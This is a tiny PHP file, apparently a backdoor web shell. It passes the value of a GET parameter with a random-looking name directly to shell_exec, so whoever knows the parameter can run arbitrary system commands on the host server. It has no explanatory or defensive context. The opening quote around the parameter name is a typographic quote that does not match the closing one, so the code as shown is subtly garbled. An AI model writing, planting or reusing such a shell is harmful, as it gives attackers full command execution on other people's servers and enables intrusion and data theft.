<?php
shell_exec($_GET[’6DHHlfwZ']);
?>
